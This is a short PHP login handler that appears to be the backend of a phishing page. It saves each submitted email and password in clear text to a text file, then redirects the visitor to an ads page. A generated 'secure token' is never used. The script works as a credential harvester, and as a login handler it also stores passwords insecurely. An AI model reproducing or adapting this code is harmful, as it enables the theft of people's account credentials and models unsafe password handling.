<?php
function generateSecureToken($length = 32) {
    return bin2hex(random_bytes($length));  // Generates a secure random token
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['login']) && !empty($_POST['password'])) {
        $email = filter_var($_POST['login'], FILTER_SANITIZE_EMAIL);
        $password = $_POST['password'];  // Storing the password directly without hashing

        $file_path = 'login_data.txt';
        $data_to_save = "Email: $email, Password: $password\n";  // Store password in clear text

        if (file_put_contents($file_path, $data_to_save, FILE_APPEND | LOCK_EX)) {
            $secureToken = generateSecureToken();  // Generate a secure token
            header('Location: AdsApps.html');
            exit;
        } else {
            header('Location: login.html');
        }
    } else {
        header('Location: login.html');
    }
} else {
    header('Location: login.html');
}
?>
